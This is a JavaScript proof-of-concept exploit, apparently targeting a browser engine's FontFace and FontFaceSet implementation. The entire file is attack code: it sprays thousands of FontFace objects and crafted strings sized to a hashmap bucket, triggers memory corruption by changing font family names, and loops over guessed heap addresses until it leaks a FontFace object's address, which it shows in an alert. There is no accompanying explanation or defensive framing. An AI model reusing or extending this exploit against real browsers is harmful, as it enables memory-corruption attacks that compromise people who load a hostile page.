var PAGE_SIZE = 16384;
var SIZEOF_CSS_FONT_FACE = 0xb8;
var HASHMAP_BUCKET = 208;
var STRING_OFFSET = 20;
var SPRAY_FONTS = 0x1000;
var GUESS_FONT = 0x200430000;
var NPAGES = 20;
var INVALID_POINTER = 0;
var HAMMER_FONT_NAME = "font8"; //must take bucket 3 of 8 (counting from zero)
var HAMMER_NSTRINGS = 800; //tweak this if crashing during hammer time

function poc(){

function hex(n)
{
    if((typeof n) != "number")
        return ""+n;
    return "0x" + (new Number(n)).toString(16);
}

var union = new ArrayBuffer(8);
var union_b = new Uint8Array(union);
var union_i = new Uint32Array(union);
var union_f = new Float64Array(union);

var bad_fonts = [];

for(var i = 0; i < SPRAY_FONTS; i++)
    bad_fonts.push(new FontFace("font1", "url()", {}));

var good_font = new FontFace("font2", "url(data:text/html,)", {});
bad_fonts.push(good_font);

var arrays = [];
for(var i = 0; i < 512; i++)
    arrays.push(new Array(31));

arrays[256][0] = 1.5;
arrays[257][0] = {};
arrays[258][0] = 1.5;

var jsvalue = {a: arrays[256], b: new Uint32Array(1), c: true};

var string_atomifier = {};
var string_id = 10000000;

function ptrToString(p)
{
    var s = '';
    for(var i = 0; i < 8; i++)
    {
        s += String.fromCharCode(p % 256);
        p = (p - p % 256) / 256;
    }
    return s;
}

function stringToPtr(p, o)
{
    if(o === undefined)
        o = 0;
    var ans = 0;
    for(var i = 7; i >= 0; i--)
        ans = 256 * ans + p.charCodeAt(o+i);
    return ans;
}

var strings = [];

function mkString(l, head)
{
    var s = head + '\u0000'.repeat(l-STRING_OFFSET-8-head.length) + (string_id++);
    string_atomifier[s] = 1;
    strings.push(s);
    return s;
}

var guf = GUESS_FONT;
var ite = true;
var matches = 0;

do
{

var p_s = ptrToString(NPAGES+2); // vector.size()
for(var i = 0; i < NPAGES; i++)
    p_s += ptrToString(guf + i * PAGE_SIZE);
p_s += ptrToString(INVALID_POINTER);

for(var i = 0; i < 256; i++)
    mkString(HASHMAP_BUCKET, p_s);

var ffs = new FontFaceSet(bad_fonts);

var badstr1 = mkString(HASHMAP_BUCKET, p_s);

var guessed_font = null;
var guessed_addr = null;

for(var i = 0; i < SPRAY_FONTS; i++)
{
    bad_fonts[i].family = "evil";
    if(badstr1.substr(0, p_s.length) != p_s)
    {
        guessed_font = i;
        var p_s1 = badstr1.substr(0, p_s.length);
        for(var i = 1; i <= NPAGES; i++)
        {
            if(p_s1.substr(i*8, 8) != p_s.substr(i*8, 8))
            {
                guessed_addr = stringToPtr(p_s.substr(i*8, 8));
                break;
            }
        }
        if(matches++ == 0)
        {
            guf = guessed_addr + 2 * PAGE_SIZE;
            guessed_addr = null;
        }
        break;
    }
}

if((ite = !ite))
    guf += NPAGES * PAGE_SIZE;

}
while(guessed_addr === null);

alert("guessed fontface addr: "+guessed_font+" -> "+hex(guessed_addr));
}
